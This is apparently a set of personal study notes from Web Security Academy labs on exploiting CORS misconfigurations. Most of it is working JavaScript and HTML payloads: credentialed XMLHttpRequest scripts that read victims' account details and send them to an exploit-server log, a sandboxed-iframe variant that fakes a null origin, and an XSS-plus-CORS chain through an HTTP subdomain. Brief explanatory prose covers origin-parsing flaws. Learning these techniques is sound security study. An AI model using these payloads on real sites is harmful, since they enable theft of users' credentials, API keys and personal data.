____

![[Pasted image 20250127181648.png]]

```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a1100170345bf0c80f01209004f0064.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```

____
Errors parsing Origin headers

suppose an application grants access to all domains ending in:
`normal-website.com`
An attacker might be able to gain access by registering the domain:
`hackersnormal-website.com`
Alternatively, suppose an application grants access to all domains beginning with
`normal-website.com`
An attacker might be able to gain access using the domain:
`normal-website.com.evil-user.net`

____
The specification for the Origin header supports the value `null`
Using an `<iframe>` with the `sandbox` attribute can bypass certain restrictions and simulate a `null` origin when testing insecure CORS **configurations**
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get', 'https://0ada006c04817488807e76b3005b0066.web-security-academy.net/accountDetails', true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location = 'https://exploit-0a9a008904eb743c806375f8019f00e7.exploit-server.net/log?key=' + encodeURIComponent(this.responseText);
    };
</script>">
</iframe>
```

___

## Exploiting XSS via CORS trust relationships - Continued

Given the following request:

```
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: https://subdomain.vulnerable-website.com 
Cookie: sessionid=...
```

If the server responds with:

```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com 
Access-Control-Allow-Credentials: true
```

Then an attacker who finds an XSS vulnerability on `subdomain.vulnerable-website.com` could use that to retrieve the API key, using a URL like:

```
https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>
```

___

## Breaking TLS with poorly configured CORS

Suppose an application that rigorously employs HTTPS also whitelists a trusted subdomain that is using plain HTTP. For example, when the application receives the following request:

```
GET /api/requestApiKey HTTP/1.1 
Host: vulnerable-website.com 
Origin: http://trusted-subdomain.vulnerable-website.com 
Cookie: sessionid=...`
```

The application responds with:

```
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com Access-Control-Allow-Credentials: true
```

![[Pasted image 20250129105731.png]]
### XSS
```
http://stock.0aa6008303dee18f80f021c700ac0029.web-security-academy.net/?productId=1%3Cscript%3Ealert()%3C/script%3E&storeId=1
```

```html
<script>
    document.location="http://stock.0aa6008303dee18f80f021c700ac0029.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0aa6008303dee18f80f021c700ac0029.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0aa90088036ce16b80c920c301c200f2.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

